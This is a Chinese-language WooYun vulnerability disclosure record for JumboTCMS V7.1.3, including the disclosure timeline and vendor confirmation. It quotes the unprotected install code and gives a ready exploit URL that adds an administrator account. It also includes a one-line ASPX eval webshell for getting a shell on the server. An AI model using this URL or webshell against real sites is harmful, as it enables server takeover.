{"id": 70515, "wybug_id": "wooyun-2015-0122734", "wybug_title": "jumbotcms V7.1.3任意添加管理员帐号密码到后台getshell", "wybug_corp": "jumbotcms.net", "wybug_author": "不能忍", "wybug_date": "2015-07-06 15:50", "wybug_open_date": "2015-10-04 16:10", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-06：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-06：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-07-09：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-08-30：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-09：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-19：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-04：\t细节向公众公开  简要描述： 任意添加管理员帐号密码，登录到后台就能轻松getshell了 详细说明：  尽管安装系统之后，系统是有提示删除install目录（但并不是强制删除），我想不是每个用户都会这么做的。也尽管/install/default.aspx处确实是有判断系统是否已经安装如果已经安装就跳转到主页，但是/install目录下的step1.aspx和step2.aspx是没有判断的。step1.aspx文件主要是配置数据库参数，而step2.aspx是配置管理员信息。并且由于step1.aspx写入的配置文件是:~/_data/config/conn.config应该是不能getshell的，所以被没有什么卵用。我们来看看step2.aspx:private void Step2()\t\t{\t\t\tstring strXmlFile = HttpContext.Current.Server.MapPath(\"~/_data/config/site.config\");\t\t\tXmlControl XmlTool = new XmlControl(strXmlFile);\t\t\tXmlTool.Update(\"Root/Name\", base.q(\"sitename\"));\t\t\tXmlTool.Update(\"Root/Name2\", base.q(\"sitename2\"));\t\t\tXmlTool.Update(\"Root/StaticExt\", base.q(\"staticext\"));\t\t\tXmlTool.Update(\"Root/SiteStartYear\", System.DateTime.Now.Year.ToString());\t\t\tXmlTool.Save();\t\t\tXmlTool.Dispose();\t\t\tstring _Email = base.q(\"email\");\t\t\tstring _UserName = base.q(\"username\");\t\t\tstring _UserPass = base.q(\"userpass\");\t\t\tstring _AdminName = base.q(\"adminname\");\t\t\tstring _AdminPass = base.q(\"adminpass\");\t\t\tif (new Normal_UserDAL().Register(_UserName, _UserName, _UserPass, 0, _Email, \"1980-1-1\", \"\", _AdminName, _AdminPass, \"\", \"\", false) > 0)\t\t\t{\t\t\t\tstrXmlFile = HttpContext.Current.Server.MapPath(\"~/_data/config/site.config\");\t\t\t\tXmlTool = new XmlControl(strXmlFile);\t\t\t\tXmlTool.Update(\"Root/Founders\", \".\" + _AdminName + \".\");\t\t\t\tXmlTool.Save();\t\t\t\tXmlTool.Dispose();\t\t\t\tnew SiteDAL().CreateSiteFiles();\t\t\t\tbase.SetupSystemDate();\t\t\t\tSystem.IO.StreamWriter sw = new System.IO.StreamWriter(HttpContext.Current.Request.PhysicalApplicationPath + \"\\\\_data\\\\install.dat\", true, System.Text.Encoding.UTF8);\t\t\t\tsw.WriteLine(\"ok\");\t\t\t\tsw.Close();\t\t\t\tsw.Dispose();\t\t\t\tthis._response = \"ok\";\t\t\t}\t\t\telse\t\t\t{\t\t\t\tthis._response = \"管理员添加失败\";\t\t\t}\t\t}这里有个register方法，跟进：\tusing (DbOperHandler _doh = new Common().Doh())\t{\t\tstring _userpass2 = MD5.Last64(_userpass);\t\tstring _adminpass2 = MD5.Last64(_adminpass);\t\tint dPoints = base.Str2Int(XmlCOM.ReadConfig(\"~/_data/config/site\", \"DefaultPoints\"), 0);\t\tint uState = this.site.CheckReg ? 0 : 1;\t\tobject[,] array = new object[2, 19];\t\tarray[0, 0] = \"UserName\";\t\tarray[0, 1] = \"NickName\";\t\tarray[0, 2] = \"UserPass\";\t\tarray[0, 3] = \"Sex\";\t\tarray[0, 4] = \"Email\";\t\tarray[0, 5] = \"Birthday\";\t\tarray[0, 6] = \"Group\";\t\tarray[0, 7] = \"Points\";\t\tarray[0, 8] = \"Login\";\t\tarray[0, 9] = \"State\";\t\tarray[0, 10] = \"AdminId\";\t\tarray[0, 11] = \"AdminSetting\";\t\tarray[0, 12] = \"UserSign\";\t\tarray[0, 13] = \"AdminState\";\t\tarray[0, 14] = \"IsVIP\";\t\tarray[0, 15] = \"Integral\";\t\tarray[0, 16] = \"RegTime\";\t\tarray[0, 17] = \"RegIp\";\t\tarray[0, 18] = \"Token_\" + _oauth_code;\t\tarray[1, 0] = _username;\t\tarray[1, 1] = _nickname;\t\tarray[1, 2] = _userpass2;\t\tarray[1, 3] = _sex;\t\tarray[1, 4] = _email;\t\tarray[1, 5] = _birthday;\t\tarray[1, 6] = 1;\t\tarray[1, 7] = dPoints;\t\tarray[1, 8] = 0;\t\tarray[1, 9] = uState;\t\tarray[1, 10] = 0;\t\tarray[1, 11] = \",,\";\t\tarray[1, 12] = _usersign;\t\tarray[1, 13] = 0;\t\tarray[1, 14] = 0;\t\tarray[1, 15] = 0;\t\tarray[1, 16] = DateTime.Now.ToString();\t\tarray[1, 17] = IPHelp.ClientIP;\t\tarray[1, 18] = _oauth_token;\t\tobject[,] addFields = array;\t\t_doh.Reset();\t\t_doh.AddFieldItems(addFields);\t\tint _uID = _doh.Insert(\"jcms_normal_user\");\t\tDirFile.CopyFile(\"~/_data/avatar/0_l.jpg\", \"~/_data/avatar/\" + _uID + \"_l.jpg\", true);\t\tDirFile.CopyFile(\"~/_data/avatar/0_m.jpg\", \"~/_data/avatar/\" + _uID + \"_m.jpg\", true);\t\tDirFile.CopyFile(\"~/_data/avatar/0_s.jpg\", \"~/_data/avatar/\" + _uID + \"_s.jpg\", true);\t\tif (_adminname.Length > 0 && _adminpass.Length > 0)\t\t{\t\t\t_doh.Reset();\t\t\t_doh.ConditionExpress = \"id=\" + _uID;\t\t\t_doh.AddFieldItem(\"State\", 1);\t\t\t_doh.AddFieldItem(\"AdminState\", 1);\t\t\t_doh.AddFieldItem(\"AdminId\", _uID);\t\t\t_doh.AddFieldItem(\"AdminName\", _adminname);\t\t\t_doh.AddFieldItem(\"AdminPass\", _adminpass2);\t\t\t_doh.AddFieldItem(\"Group\", this.site.AdminGroupId);\t\t\t_doh.Update(\"jcms_normal_user\");\t\t\t_doh.Reset();\t\t\t_doh.ConditionExpress = \"id=\" + this.site.AdminGroupId;\t\t\t_doh.Add(\"jcms_normal_usergroup\", \"UserTotal\");\t\t}这里大概是获取用户提交过来的帐号密码，然后添加到数据库。最重要的是：_doh.AddFieldItem(\"Group\", this.site.AdminGroupId);添加管理组，这个比较给力了。由于是直接写数据库所以密码还是要先md5加密好之后再提交！所以构造出来大概是：http://localhost/install/step2.aspx?sitename=%E5%B0%86%E5%8D%9Acms%E9%80%9A%E7%94%A8%E7%89%88&dbtype=1&staticext=%2Ehtml&username=wooyun&userpass=fbb204a4061ffbd41284a84c258c1bfb&adminpass=fbb204a4061ffbd41284a84c258c1bfb&email=admin%401%2Ecom&adminname=wooyun&sitename2=%E5%B0%86%E5%8D%9A后台getshell方面：进入后台以后点击模型管理，然后找到html模型，添加一个模型，然后后缀名填写.htm内容是一句话：<% @Page Language=\"Jscript\"%><%eval(Request.Item[\"wooyun\"],\"unsafe\");%>点击保存之后抓包修改，把.htm改成.aspx之后连接菜刀就ok了！   漏洞证明：  \n\n\n\n\n\n\n\n   修复方案：     版权声明：转载请注明来源 不能忍@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-07-06 16:09 厂商回复： 源码研究的比较透彻，给力 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}